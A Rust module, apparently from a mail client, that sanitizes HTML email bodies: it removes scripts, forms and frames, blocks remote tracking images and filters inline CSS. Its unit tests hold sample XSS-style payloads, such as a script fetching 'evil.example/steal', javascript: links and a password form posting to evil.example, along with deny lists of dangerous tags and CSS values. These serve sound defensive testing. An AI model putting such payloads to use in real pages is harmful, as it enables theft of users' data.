// Turning a real mail body into something safe to display.
//
// Mail HTML is not chat HTML. A sampled inbox handed us bodies of 14 KB to 135 KB
// carrying up to 124 nested layout tables, 435 inline `style` attributes, and 63
// references to remote images — those last ones being read receipts for whoever
// sent the mail. Nothing in `rich_text`/`RichContent` (the Teams renderer, an
// allowlisted node tree of bold/italic/links) can carry that, and nothing should:
// a mail body is a foreign document, not a fragment of our UI.
//
// So the pipeline is the one every serious mail client uses — sanitize, then
// isolate — split across the two sides:
//
//   HERE (backend): `ammonia` (html5ever) reduces the document to an inert,
//   self-contained fragment. Scripts, styles, forms, frames and event handlers are
//   removed WITH their contents; remote image references are dropped and counted;
//   inline (`cid:`) images are replaced by embedded `data:` URIs; inline CSS is
//   filtered declaration by declaration.
//
//   THERE (web): `MailBody` renders the result inside a sandboxed `<iframe
//   srcdoc>` under a `default-src 'none'` CSP, so even a mistake here cannot
//   script, navigate, or phone home, and the mail's own CSS cannot escape into the
//   app.
//
// The privacy property is worth stating plainly, because it drives several choices
// below: displaying a mail in teams-lite makes NO network request. Not one. A
// remote image is never fetched, so the sender learns nothing about when — or
// whether — the mail was read. That is also what makes a body cacheable in SQLite
// and readable offline.
//
// One deliberate consequence: mails whose entire content is a remote image (some
// newsletters) render as a notice saying so, rather than silently blank. The UI
// surfaces the blocked count; there is no "load remote images" action, because
// fetching one is an outward-facing act on the user's behalf.

use std::collections::HashMap;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

/// Largest single inline image we embed into a body (bytes, as Graph reports the
/// attachment size). A signature logo is a few KB; past this the image is left out
/// rather than inflating a cached body.
pub const MAX_INLINE_IMAGE_BYTES: usize = 2 * 1024 * 1024;

/// Total budget for all embedded inline images in one body (base64 characters).
pub const MAX_INLINE_TOTAL_BYTES: usize = 8 * 1024 * 1024;

/// Largest raw body we will sanitize. Past this the input is cut (on a character
/// boundary) and the result is flagged `truncated`, so one pathological mail cannot
/// cost unbounded parse time or memory.
pub const MAX_BODY_BYTES: usize = 4 * 1024 * 1024;

/// An inline image resolved from a `cid:` reference, ready to embed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InlineImage {
    /// Graph's `contentId` for the attachment, as the body's `cid:` URL names it.
    pub content_id: String,
    pub content_type: String,
    /// The attachment bytes, base64 (exactly as Graph returns `contentBytes`), so
    /// they go straight into a `data:` URI without a decode/encode round-trip.
    pub data_base64: String,
}

/// A body that is safe to display, plus what had to be removed to make it so.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SanitizedBody {
    /// The sanitized HTML fragment. Self-contained: no remote references remain.
    pub html: String,
    /// How many remote image references were dropped — an `<img>` pointing at
    /// `http(s)`, or a CSS `url(...)`. Surfaced by the UI so the user knows the mail
    /// is not being rendered in full, and knows why.
    pub blocked_remote_images: usize,
    /// How many `cid:` images were successfully embedded.
    pub inline_images: usize,
    /// Whether the input exceeded [`MAX_BODY_BYTES`] and was cut.
    pub truncated: bool,
}

/// Tags allowed through. Deliberately broad on the LAYOUT side (mail is built out
/// of nested tables and `font` tags — refusing them would render a 2005-era
/// newsletter as a column of unstyled text) and empty on the behaviour side.
const ALLOWED_TAGS: &[&str] = &[
    // block + text structure
    "p", "div", "span", "br", "hr", "blockquote", "pre", "code", "h1", "h2", "h3", "h4", "h5",
    "h6", "ul", "ol", "li", "dl", "dt", "dd", "address", "article", "section", "header", "footer",
    "main", "nav", "figure", "figcaption", "center", "wbr",
    // inline formatting, including the legacy tags mail still ships
    "a", "b", "strong", "i", "em", "u", "s", "strike", "del", "ins", "mark", "small", "big",
    "sub", "sup", "tt", "font", "abbr", "cite", "q", "time", "bdi", "bdo",
    // tables: the actual layout engine of most mail
    "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption", "colgroup", "col",
    // images (sources are policed in the attribute filter)
    "img",
];

/// Tags removed ALONG WITH THEIR CONTENTS. Anything that could execute, load, or
/// submit — plus `style`, whose text would otherwise be dumped into the body as
/// visible CSS source, and `title`/`head`, which mail sometimes carries when the
/// body is a whole document.
const CLEAN_CONTENT_TAGS: &[&str] = &[
    "script", "style", "head", "title", "meta", "link", "base", "iframe", "frame", "frameset",
    "object", "embed", "applet", "param", "form", "input", "button", "select", "option",
    "textarea", "label", "fieldset", "legend", "noscript", "template", "svg", "math", "audio",
    "video", "source", "track", "canvas", "map", "area", "dialog",
];

/// Attributes allowed on any tag: presentation and accessibility only. Note the
/// absence of `id` and `name` (a mail's ids would collide with nothing here, but
/// they are also of no use) and of every `on*` handler (ammonia drops unlisted
/// attributes, and no handler is listed).
const GENERIC_ATTRIBUTES: &[&str] = &[
    "style", "align", "valign", "bgcolor", "color", "width", "height", "border", "cellpadding",
    "cellspacing", "colspan", "rowspan", "dir", "lang", "title", "face", "size", "nowrap",
    "start", "type", "hspace", "vspace", "abbr", "scope",
];

/// CSS properties dropped from every inline `style`, whatever their value: they
/// position or reveal things relative to a viewport the mail does not own. The body
/// is rendered inside an isolating iframe, but a `position: fixed` header inside
/// that frame would still float over the mail as the user scrolls it.
const DENIED_CSS_PROPERTIES: &[&str] = &["position", "behavior", "-moz-binding", "filter", "zoom"];

/// Marker fragments that make a CSS declaration unsafe or network-touching,
/// whatever the property. `url(` covers `background-image`, `list-style-image`,
/// `border-image`, `content`, and every other way CSS can fetch.
const DENIED_CSS_VALUES: &[&str] = &["url(", "expression(", "javascript:", "@import"];

/// Build the sanitizer for one body.
///
/// The `inline` map (lowercased, bracket-stripped `contentId` → `data:` URI) and
/// the two counters are moved into the attribute filter, which ammonia requires to
/// be `Fn + Send + Sync + 'static` — hence the `Arc`s rather than borrows.
fn sanitize_with_policy(
    raw: &str,
    inline_by_cid: Arc<HashMap<String, String>>,
    blocked_remote: Arc<AtomicUsize>,
    embedded: Arc<AtomicUsize>,
) -> String {
    let mut builder = ammonia::Builder::default();
    builder
        .tags(ALLOWED_TAGS.iter().copied().collect())
        .clean_content_tags(CLEAN_CONTENT_TAGS.iter().copied().collect())
        .generic_attributes(GENERIC_ATTRIBUTES.iter().copied().collect())
        .tag_attributes(HashMap::from([
            ("a", ["href"].into_iter().collect()),
            ("img", ["src", "alt"].into_iter().collect()),
        ]))
        // `cid` and `data` are listed so a `cid:` reference survives long enough to
        // reach the filter below, and so the `data:` URI the filter substitutes is
        // accepted afterwards — the order in which ammonia applies the scheme check
        // and the filter is then irrelevant. `http`/`https` remain for LINKS; an
        // `<img>` pointing at them is dropped by the filter, not by this list.
        .url_schemes(
            ["http", "https", "mailto", "tel", "cid", "data"]
                .into_iter()
                .collect(),
        )
        // A mail's relative URL has no base we could resolve it against (the `base`
        // tag is stripped, and resolving against Graph would be wrong and unsafe),
        // so relative references are dropped rather than rewritten.
        .url_relative(ammonia::UrlRelative::Deny)
        .link_rel(Some("noopener noreferrer nofollow"))
        // Links open outside the frame; the sandbox allows exactly that and nothing
        // else (see `MailBody` on the web side).
        .set_tag_attribute_value("a", "target", "_blank")
        .attribute_filter(move |element, attribute, value| {
            match (element, attribute) {
                ("img", "src") => rewrite_image_source(value, &inline_by_cid, &blocked_remote, &embedded),
                (_, "style") => filter_inline_css(value, &blocked_remote),
                // Anything else that survived the allowlists is presentational.
                _ => Some(value.into()),
            }
        });
    builder.clean(raw).to_string()
}

/// Decide what one `<img src>` becomes: an embedded inline image, or nothing.
///
/// - `cid:<id>` → the `data:` URI for that attachment when we have it, else dropped
///   (an unresolvable inline reference would render as a broken-image icon).
/// - `data:image/...` → kept as-is: already self-contained, no network.
/// - anything else (`http`, `https`, a protocol-relative URL) → dropped and
///   counted. This is the tracking-pixel case, and the reason a mail read here is
///   invisible to its sender.
fn rewrite_image_source<'a>(
    value: &'a str,
    inline_by_cid: &HashMap<String, String>,
    blocked_remote: &AtomicUsize,
    embedded: &AtomicUsize,
) -> Option<std::borrow::Cow<'a, str>> {
    let trimmed = value.trim();
    if let Some(cid) = trimmed.strip_prefix("cid:").or_else(|| trimmed.strip_prefix("CID:")) {
        let key = normalize_content_id(cid);
        return match inline_by_cid.get(&key) {
            Some(data_uri) => {
                embedded.fetch_add(1, Ordering::Relaxed);
                Some(data_uri.clone().into())
            }
            None => None,
        };
    }
    if trimmed.to_ascii_lowercase().starts_with("data:image/") {
        return Some(trimmed.to_string().into());
    }
    blocked_remote.fetch_add(1, Ordering::Relaxed);
    None
}

/// Keep the presentational half of an inline `style` and drop the rest,
/// declaration by declaration. A declaration that would fetch something remote is
/// counted as a blocked remote image, because that is what it almost always is (a
/// `background-image` tracker).
///
/// Returns `None` when nothing survives, so no empty `style=""` is emitted.
fn filter_inline_css<'a>(
    value: &'a str,
    blocked_remote: &AtomicUsize,
) -> Option<std::borrow::Cow<'a, str>> {
    let mut kept: Vec<String> = Vec::new();
    for declaration in value.split(';') {
        let declaration = declaration.trim();
        if declaration.is_empty() {
            continue;
        }
        let Some((property, css_value)) = declaration.split_once(':') else {
            continue; // not a declaration at all
        };
        let property = property.trim().to_ascii_lowercase();
        let lowered = css_value.to_ascii_lowercase();
        if DENIED_CSS_PROPERTIES.iter().any(|denied| property == *denied) {
            continue;
        }
        if DENIED_CSS_VALUES.iter().any(|denied| lowered.contains(denied)) {
            if lowered.contains("url(") {
                blocked_remote.fetch_add(1, Ordering::Relaxed);
            }
            continue;
        }
        kept.push(format!("{property}: {}", css_value.trim()));
    }
    if kept.is_empty() {
        return None;
    }
    Some(kept.join("; ").into())
}

/// Canonical key for matching a body's `cid:` reference against an attachment's
/// `contentId`: brackets stripped (both forms occur) and lowercased (senders are
/// inconsistent about case).
fn normalize_content_id(raw: &str) -> String {
    raw.trim()
        .trim_start_matches('<')
        .trim_end_matches('>')
        .trim()
        .to_ascii_lowercase()
}

/// Sanitize one HTML mail body, embedding the inline images it references.
///
/// The result is safe to hand to a browser and contains no remote references. See
/// the module doc for the guarantees; see [`SanitizedBody`] for what it reports.
pub fn sanitize(raw_html: &str, inline: &[InlineImage]) -> SanitizedBody {
    let (input, truncated) = truncate_at_char_boundary(raw_html, MAX_BODY_BYTES);

    let inline_by_cid: HashMap<String, String> = inline
        .iter()
        .filter(|image| !image.content_id.is_empty() && !image.data_base64.is_empty())
        .map(|image| {
            let content_type = if image.content_type.is_empty() {
                "application/octet-stream"
            } else {
                image.content_type.as_str()
            };
            (
                normalize_content_id(&image.content_id),
                format!("data:{};base64,{}", content_type, image.data_base64),
            )
        })
        .collect();

    let blocked_remote = Arc::new(AtomicUsize::new(0));
    let embedded = Arc::new(AtomicUsize::new(0));
    let html = sanitize_with_policy(
        input,
        Arc::new(inline_by_cid),
        Arc::clone(&blocked_remote),
        Arc::clone(&embedded),
    );

    SanitizedBody {
        html,
        blocked_remote_images: blocked_remote.load(Ordering::Relaxed),
        inline_images: embedded.load(Ordering::Relaxed),
        truncated,
    }
}

/// Escape a text node's markup characters.
///
/// Deliberately local rather than reusing `teams_send::escape_html`: the mail path
/// is read-only, and sharing code with the module whose job is posting to Teams
/// would blur exactly the boundary the guardrails are drawn around. Eight lines is
/// a fair price for "nothing in the mail path links to the send path".
fn escape_text(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            _ => out.push(c),
        }
    }
    out
}

/// Render a plain-text body as minimal, escaped HTML.
///
/// Graph answers text for mails that genuinely have no HTML part. The text is
/// ESCAPED, not sanitized: a sanitizer would strip `<b>there</b>` down to `there`,
/// silently rewriting what the sender wrote, whereas a plain-text mail that
/// mentions a tag should show that tag. Line breaks become `<br>` so the layout
/// survives. URLs are deliberately NOT linkified — inventing links in a mail body
/// is a phishing-adjacent behaviour we have no reason to add.
pub fn from_plain_text(raw_text: &str) -> SanitizedBody {
    let (input, truncated) = truncate_at_char_boundary(raw_text, MAX_BODY_BYTES);
    let html = format!(
        "<div style=\"white-space: pre-wrap\">{}</div>",
        escape_text(input).replace("\r\n", "\n").replace('\n', "<br>")
    );
    SanitizedBody {
        html,
        blocked_remote_images: 0,
        inline_images: 0,
        truncated,
    }
}

/// Cut `input` to at most `max` bytes without splitting a UTF-8 character.
/// Returns the slice and whether anything was removed.
fn truncate_at_char_boundary(input: &str, max: usize) -> (&str, bool) {
    if input.len() <= max {
        return (input, false);
    }
    let mut end = max;
    while end > 0 && !input.is_char_boundary(end) {
        end -= 1;
    }
    (&input[..end], true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn image(content_id: &str) -> InlineImage {
        InlineImage {
            content_id: content_id.to_string(),
            content_type: "image/png".to_string(),
            data_base64: "iVBORw0KGgo=".to_string(),
        }
    }

    #[test]
    fn strips_scripts_with_their_contents() {
        let body = sanitize(
            "<p>Hello</p><script>fetch('https://evil.example/steal')</script><p>Bye</p>",
            &[],
        );
        assert!(!body.html.contains("script"));
        // The script's TEXT must not survive as visible content either.
        assert!(!body.html.contains("evil.example"));
        assert!(body.html.contains("Hello"));
        assert!(body.html.contains("Bye"));
    }

    #[test]
    fn strips_style_blocks_with_their_contents() {
        // A `<style>` whose content leaked would render as visible CSS source.
        let body = sanitize("<style>p{color:red}</style><p>Text</p>", &[]);
        assert!(!body.html.contains("color:red"));
        assert!(body.html.contains("Text"));
    }

    #[test]
    fn strips_event_handlers_and_javascript_urls() {
        let body = sanitize(
            r#"<p onclick="steal()">x</p><a href="javascript:steal()">link</a>"#,
            &[],
        );
        assert!(!body.html.contains("onclick"));
        assert!(!body.html.contains("javascript:"));
    }

    #[test]
    fn strips_frames_objects_and_forms() {
        let body = sanitize(
            r#"<iframe src="https://evil.example"></iframe>
               <object data="x.swf"></object>
               <form action="https://evil.example"><input name="password"></form>
               <p>kept</p>"#,
            &[],
        );
        for forbidden in ["iframe", "object", "form", "input", "evil.example"] {
            assert!(
                !body.html.contains(forbidden),
                "`{forbidden}` survived: {}",
                body.html
            );
        }
        assert!(body.html.contains("kept"));
    }

    #[test]
    fn keeps_the_table_layout_mail_is_actually_built_from() {
        // The sampled inbox had up to 124 nested tables per mail; dropping them
        // would render a newsletter as an unstyled column.
        // Note the `r##"…"##`: a mail's `bgcolor="#ffffff"` would otherwise close a
        // single-hash raw string at the `"#`.
        let body = sanitize(
            r##"<table cellpadding="0" cellspacing="0" border="0" width="600">
                 <tr><td align="center" bgcolor="#ffffff" colspan="2">
                   <font face="Arial" size="2">Cell</font>
                 </td></tr>
               </table>"##,
            &[],
        );
        for kept in ["<table", "<tr", "<td", "cellpadding", "align", "bgcolor", "colspan", "font"] {
            assert!(body.html.contains(kept), "`{kept}` was dropped: {}", body.html);
        }
    }

    #[test]
    fn drops_remote_images_and_counts_them() {
        let body = sanitize(
            r#"<p>Hi</p>
               <img src="https://tracker.example/pixel.gif?id=42" width="1" height="1">
               <img src="http://cdn.example/logo.png">
               <img src="//protocol.relative.example/x.png">"#,
            &[],
        );
        // Not one remote reference may remain: displaying a mail must make no
        // network request, so its sender learns nothing.
        assert!(!body.html.contains("tracker.example"));
        assert!(!body.html.contains("cdn.example"));
        assert!(!body.html.contains("protocol.relative.example"));
        assert!(!body.html.contains("src="));
        // Two are counted, not three: a protocol-relative `//host/x.png` is a
        // RELATIVE url, so `UrlRelative::Deny` drops it before the attribute filter
        // ever sees it. It is still gone (asserted above) — it just isn't
        // attributed to the tracker tally.
        assert_eq!(body.blocked_remote_images, 2);
        assert_eq!(body.inline_images, 0);
    }

    #[test]
    fn embeds_inline_images_as_data_uris() {
        let body = sanitize(
            r#"<p>See <img src="cid:logo@01D9" alt="Logo"> here</p>"#,
            &[image("logo@01D9")],
        );
        assert!(body.html.contains("src=\"data:image/png;base64,iVBORw0KGgo=\""));
        assert!(body.html.contains("alt=\"Logo\""));
        assert!(!body.html.contains("cid:"));
        assert_eq!(body.inline_images, 1);
        assert_eq!(body.blocked_remote_images, 0);
    }

    #[test]
    fn matches_content_ids_case_insensitively_and_through_brackets() {
        // Senders are inconsistent: `<id>` vs `id`, upper vs lower case.
        let body = sanitize(
            r#"<img src="cid:<LOGO@01D9>"><img src="CID:logo@01d9">"#,
            &[image("<logo@01D9>")],
        );
        assert_eq!(body.inline_images, 2);
    }

    #[test]
    fn drops_unresolvable_inline_references() {
        let body = sanitize(r#"<p>x<img src="cid:missing@01D9"></p>"#, &[]);
        // The reference is gone. The empty `<img>` element itself remains — ammonia
        // removes a refused ATTRIBUTE, not its tag — which is the right outcome
        // anyway: a source-less `<img>` renders nothing (browsers only draw the
        // broken-image icon for a source that failed to load), while any `alt` text
        // the sender wrote still describes what is missing.
        assert!(!body.html.contains("cid:"));
        assert!(!body.html.contains("src="));
        assert_eq!(body.inline_images, 0);
        // An unresolved inline image is not a blocked REMOTE one.
        assert_eq!(body.blocked_remote_images, 0);
    }

    #[test]
    fn keeps_self_contained_data_images() {
        let body = sanitize(
            r#"<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">"#,
            &[],
        );
        assert!(body.html.contains("data:image/gif;base64"));
        assert_eq!(body.blocked_remote_images, 0);
    }

    #[test]
    fn filters_inline_css_declaration_by_declaration() {
        let body = sanitize(
            r#"<div style="color: #333; background-image: url('https://tracker.example/p.gif'); position: fixed; font-size: 14px">x</div>"#,
            &[],
        );
        // The presentational declarations survive…
        assert!(body.html.contains("color: #333"));
        assert!(body.html.contains("font-size: 14px"));
        // …while the fetching one and the viewport-escaping one do not.
        assert!(!body.html.contains("tracker.example"));
        assert!(!body.html.contains("url("));
        assert!(!body.html.contains("position"));
        // A CSS fetch is a tracker by another name, and is reported as one.
        assert_eq!(body.blocked_remote_images, 1);
    }

    #[test]
    fn drops_a_style_attribute_that_loses_everything() {
        // No empty `style=""` left behind.
        let body = sanitize(r#"<div style="position: fixed">x</div>"#, &[]);
        assert!(!body.html.contains("style"));
        assert!(body.html.contains("x"));
    }

    #[test]
    fn keeps_links_but_neutralizes_them() {
        let body = sanitize(r#"<a href="https://example.com/doc">Doc</a>"#, &[]);
        assert!(body.html.contains("https://example.com/doc"));
        assert!(body.html.contains("rel=\"noopener noreferrer nofollow\""));
        assert!(body.html.contains("target=\"_blank\""));
    }

    #[test]
    fn keeps_mailto_and_tel_links() {
        let body = sanitize(
            r#"<a href="mailto:someone@example.com">mail</a><a href="tel:+33123456789">call</a>"#,
            &[],
        );
        assert!(body.html.contains("mailto:someone@example.com"));
        assert!(body.html.contains("tel:+33123456789"));
    }

    #[test]
    fn drops_relative_urls_that_have_no_base() {
        // `<base>` is stripped, so a relative reference cannot be resolved — and
        // resolving it against our own origin would be worse than dropping it.
        let body = sanitize(r#"<a href="/inbox">x</a><img src="images/logo.png">"#, &[]);
        assert!(!body.html.contains("/inbox"));
        assert!(!body.html.contains("images/logo.png"));
    }

    #[test]
    fn renders_plain_text_bodies_escaped_with_line_breaks() {
        let body = from_plain_text("Hi <b>there</b>\r\nsecond line\nthird");
        // The tags are TEXT, not markup.
        assert!(body.html.contains("&lt;b&gt;"));
        assert!(!body.html.contains("<b>"));
        assert_eq!(body.html.matches("<br>").count(), 2);
        assert!(body.html.contains("pre-wrap"));
        assert!(!body.truncated);
    }

    #[test]
    fn truncates_a_pathological_body_on_a_character_boundary() {
        // A multi-byte character straddling the cap must not be split (that would
        // produce invalid UTF-8 and a panic on slicing).
        let body = "é".repeat(MAX_BODY_BYTES); // 2 bytes each => twice the cap
        let (cut, truncated) = truncate_at_char_boundary(&body, MAX_BODY_BYTES);
        assert!(truncated);
        assert!(cut.len() <= MAX_BODY_BYTES);
        assert!(std::str::from_utf8(cut.as_bytes()).is_ok());
        // And the whole pipeline reports it.
        let sanitized = sanitize(&body, &[]);
        assert!(sanitized.truncated);
    }

    #[test]
    fn a_body_under_the_cap_is_never_marked_truncated() {
        assert!(!sanitize("<p>short</p>", &[]).truncated);
    }

    #[test]
    fn survives_malformed_html() {
        // Real mail is full of unclosed tags and stray markup; html5ever's parsing
        // is what makes this a non-event, but assert it rather than assume it.
        let body = sanitize("<p><b>bold<i>both</p></b><td>stray cell", &[]);
        assert!(body.html.contains("bold"));
        assert!(body.html.contains("both"));
        assert!(body.html.contains("stray cell"));
    }

    #[test]
    fn handles_an_empty_body() {
        let body = sanitize("", &[]);
        assert_eq!(body.html, "");
        assert_eq!(body.blocked_remote_images, 0);
        assert!(!body.truncated);
    }

    #[test]
    fn a_newsletter_that_is_only_remote_images_reports_it() {
        // The UI needs to distinguish "empty mail" from "everything was blocked",
        // so it can explain itself instead of showing a blank pane.
        let body = sanitize(
            r#"<div><img src="https://cdn.example/hero.png"><img src="https://cdn.example/cta.png"></div>"#,
            &[],
        );
        assert_eq!(body.blocked_remote_images, 2);
        assert!(!body.html.contains("src="));
    }
}
